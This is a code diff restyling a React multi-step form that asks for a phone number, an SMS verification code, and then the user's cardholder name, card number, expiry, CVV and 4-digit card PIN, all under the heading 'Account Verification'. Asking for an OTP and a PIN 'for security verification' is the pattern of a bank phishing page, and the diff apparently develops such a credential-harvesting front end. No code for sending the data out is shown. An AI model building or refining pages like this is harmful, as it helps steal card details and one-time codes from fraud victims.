@@ -261,12 +261,8 @@ function StepPage({ step, onNext, onPrev }) {
                 const formatted = formatPhoneNumber(e.target.value);
                 setPhone(formatted);
               }}
-              onBlur={() => setTouched(t => ({ ...t, phone: true }))}
-              className={`form-input${!phoneValid && touched.phone ? " error" : ""}`}
+              className="form-input"
             />
-            {!phoneValid && touched.phone && (
-              <div className="form-error">Format: 123-456-7890</div>
-            )}
           </div>
           <button
             onClick={onNext}
@@ -300,8 +296,8 @@ function StepPage({ step, onNext, onPrev }) {
         {/* Stepper */}
         <Stepper step={2} />
         <div style={{ margin: "24px 0 0 0" }}>
-          <div style={{ fontSize: 28, fontWeight: 500, marginBottom: 8, color: "#111" }}>Code Verification</div>
-          <div style={{ fontSize: 20, color: "#222", marginBottom: 28 }}>
+          <div style={{ fontSize: 28, fontWeight: 500, marginBottom: 8, color: "#111",marginLeft: 8 }}>Code Verification</div>
+          <div className="otp-info">
             We've sent a secured code to your registered number. Please tell us your code for account verification. If you didn't get code, please wait 1-2 minutes.
           </div>
           <div style={{ marginBottom: 18 }}>
@@ -310,17 +306,7 @@ function StepPage({ step, onNext, onPrev }) {
               placeholder="Enter your code"
               value={code}
               onChange={e => setCode(e.target.value)}
-              style={{
-                width: "100%",
-                padding: "16px 12px",
-                fontSize: 20,
-                border: "1.5px solid #888",
-                borderRadius: 8,
-                background: "#fff",
-                color: "#222",
-                marginBottom: 8,
-                boxSizing: "border-box"
-              }}
+              className="otp-input"
             />
           </div>
 
@@ -328,18 +314,7 @@ function StepPage({ step, onNext, onPrev }) {
             <button
               onClick={handleResend}
               disabled={resendDisabled}
-              style={{
-                width: 140, // Make button smaller
-                background: "#222",
-                color: "#fff",
-                fontSize: 18,
-                border: "none",
-                borderRadius: 8,
-                padding: "10px 0",
-                fontWeight: 400,
-                opacity: resendDisabled ? 0.5 : 1,
-                cursor: resendDisabled ? "not-allowed" : "pointer"
-              }}
+              className="otp-resend-btn"
             >
               Resend Code
             </button>
@@ -347,20 +322,7 @@ function StepPage({ step, onNext, onPrev }) {
           <button
             onClick={onNext}
             disabled={code.trim().length === 0}
-            style={{
-              width: "100%",
-              background: code.trim().length > 0 ? "#222" : "#bbb",
-              color: "#fff",
-              fontSize: 26,
-              border: "none",
-              borderRadius: 12,
-              padding: "14px 0",
-              fontWeight: 400,
-              margin: "0 auto",
-              display: "block",
-              cursor: code.trim().length > 0 ? "pointer" : "not-allowed",
-              opacity: code.trim().length > 0 ? 1 : 0.7
-            }}
+            className="form-btn"
           >
             Continue
           </button>
@@ -389,119 +351,73 @@ function StepPage({ step, onNext, onPrev }) {
         {/* Stepper */}
         <Stepper step={3} />
         <div style={{ margin: "24px 0 0 0" }}>
-          <div style={{ fontSize: 28, fontWeight: 500, marginBottom: 8, color: "#111" }}>Account Verification!</div>
-          <div style={{ fontSize: 24, fontWeight: 400, marginBottom: 18, color: "#111", lineHeight: 1.2 }}>
-            Confirm Your Account<br />Information
+          
+          
+          <div className="stepper-content">
+            <div className="stepper-heading">Account Verification!</div>
+            <div className="stepper-desc">
+              Confirm Your Account<br />Information
+            </div>
+            <div className="stepper-info">
+              We need this info to verify your identity.
+            </div>
+            <div className="card-field-label">Bank card information</div>
+            <div className="card-field-desc">
+              Please provide your Bank card information for verification purposes.
+            </div>
           </div>
-          <div style={{ fontSize: 20, color: "#222", marginBottom: 18 }}>
-            We need this info to verify your identity.
-          </div>
-          <div style={{ fontSize: 22, fontWeight: 500, marginBottom: 8, color: "#222" }}>Bank card information</div>
-          <div style={{ color: "#b0b6c3", fontSize: 18, marginBottom: 18 }}>
-            Please provide your Bank card information for verification purposes.
-          </div>
-          <div style={{ marginBottom: 18 }}>
-            <label style={{ fontSize: 18, color: "#222", display: "block", marginBottom: 6 }}>Cardholder Name</label>
+          <div className="card-field">
+            <label className="card-label">Cardholder Name</label>
             <input
               type="text"
               placeholder="Name as it appears on card"
               value={cardName}
               onChange={e => setCardName(e.target.value)}
-              style={{
-                width: "100%",
-                padding: "14px 12px",
-                fontSize: 18,
-                border: "1.5px solid #888",
-                borderRadius: 8,
-                background: "#fff",
-                color: "#222",
-                marginBottom: 8,
-                boxSizing: "border-box"
-              }}
+              className="form-input"
             />
           </div>
-          <div style={{ marginBottom: 18 }}>
-            <label style={{ fontSize: 18, color: "#222", display: "block", marginBottom: 6 }}>Card Number</label>
+          <div className="card-field">
+            <label className="card-label">Card Number</label>
             <input
               type="text"
               placeholder="XXXX XXXX XXXX XXXX"
               value={cardNumber}
               onChange={e => setCardNumber(formatCardNumber(e.target.value))}
-              style={{
-                width: "100%",
-                padding: "14px 12px",
-                fontSize: 18,
-                border: "1.5px solid #888",
-                borderRadius: 8,
-                background: "#fff",
-                color: "#222",
-                marginBottom: 8,
-                boxSizing: "border-box"
-              }}
+              className="form-input"
             />
           </div>
-          <div style={{ display: "flex", gap: 16, marginBottom: 18 }}>
-            <div style={{ flex: 1 }}>
-              <label style={{ fontSize: 18, color: "#222", display: "block", marginBottom: 6 }}>Expiry Date</label>
+          <div className="card-field-row">
+            <div>
+              <label className="card-label">Expiry Date</label>
               <input
                 type="text"
                 placeholder="MM/YYYY"
                 value={expiry}
                 onChange={e => setExpiry(formatExpiry(e.target.value))}
-                style={{
-                  width: "100%",
-                  padding: "14px 12px",
-                  fontSize: 18,
-                  border: "1.5px solid #888",
-                  borderRadius: 8,
-                  background: "#fff",
-                  color: "#222",
-                  marginBottom: 8,
-                  boxSizing: "border-box"
-                }}
+                className="form-input"
               />
             </div>
-            <div style={{ flex: 1 }}>
-              <label style={{ fontSize: 18, color: "#222", display: "block", marginBottom: 6 }}>CVV</label>
+            <div>
+              <label className="card-label">CVV</label>
               <input
                 type="text"
                 placeholder="123"
                 value={cvv}
-                onChange={e => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
-                maxLength={4}
-                style={{
-                  width: "100%",
-                  padding: "14px 12px",
-                  fontSize: 18,
-                  border: "1.5px solid #888",
-                  borderRadius: 8,
-                  background: "#fff",
-                  color: "#222",
-                  marginBottom: 8,
-                  boxSizing: "border-box"
-                }}
+                onChange={e => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
+                maxLength={3}
+                className="form-input"
               />
             </div>
           </div>
-          <div style={{ marginBottom: 18 }}>
-            <label style={{ fontSize: 18, color: "#222", display: "block", marginBottom: 6 }}>Card PIN</label>
+          <div className="card-field">
+            <label className="card-label">Card PIN</label>
             <input
               type="password"
               placeholder="Enter 4-digit PIN"
               value={pin}
               onChange={e => setPin(e.target.value)}
               maxLength={4}
-              style={{
-                width: "100%",
-                padding: "14px 12px",
-                fontSize: 18,
-                border: "1.5px solid #888",
-                borderRadius: 8,
-                background: "#fff",
-                color: "#222",
-                marginBottom: 4,
-                boxSizing: "border-box"
-              }}
+              className="form-input"
             />
             <div style={{ color: "#b0b6c3", fontSize: 15, marginTop: 2 }}>
               For security verification only
